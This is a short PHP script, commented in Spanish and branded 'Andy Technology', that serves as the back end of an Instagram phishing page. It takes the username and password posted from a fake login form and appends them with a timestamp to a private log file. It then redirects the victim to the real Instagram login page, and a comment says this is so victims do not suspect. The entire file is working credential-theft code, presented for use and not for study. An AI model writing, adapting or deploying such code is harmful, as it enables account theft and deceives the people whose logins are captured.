<?php
// Motor de captura - Propiedad de Andy Technology
$log = "registro_privado.txt"; // Nombre del archivo donde se guardarán las claves
$fecha = date('d-m-Y H:i:s');

// Agarramos lo que vino del formulario
$usuario = $_POST['user_id'];
$password = $_POST['user_pass'];

// Formato de guardado profesional
$linea = "====================================\n";
$linea .= "CAPTURADO POR: ANDY TECHNOLOGY\n";
$linea .= "Fecha: $fecha\n";
$linea .= "Usuario: $usuario\n";
$linea .= "Password: $password\n";
$linea .= "====================================\n\n";

// Escribimos en el archivo (FILE_APPEND para no borrar lo anterior)
file_put_contents($log, $linea, FILE_APPEND);

// Redirigimos al Instagram real para que no sospechen
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>